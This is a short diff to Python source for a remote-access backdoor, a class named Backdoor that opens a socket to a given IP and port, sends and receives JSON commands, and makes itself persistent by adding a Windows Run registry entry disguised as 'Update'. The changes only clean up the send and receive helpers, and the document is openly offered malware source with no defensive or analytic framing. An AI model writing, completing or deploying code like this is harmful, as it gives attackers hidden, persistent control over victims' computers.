@@ -2,6 +2,7 @@
 
 import socket, subprocess, json, os, base64, sys, shutil
 
+
 class Backdoor:
 	def __init__(self, ip, port):
 		self.become_persistent()
@@ -15,15 +16,14 @@ class Backdoor:
 			subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
 	def reliable_send(self, data):
-		json_data = json.dumps(data, encoding='latin1')
-		print(4)
+		json_data = json.dumps(data)
 		self.connection.send(json_data)
 
 	def reliable_receive(self):
 		json_data = ""
 		while True:
 			try:
-				json_data = json_data + self.connection.recv(1024)
+				json_data += self.connection.recv(1024)
 				return json.loads(json_data)
 			except ValueError:
 				continue
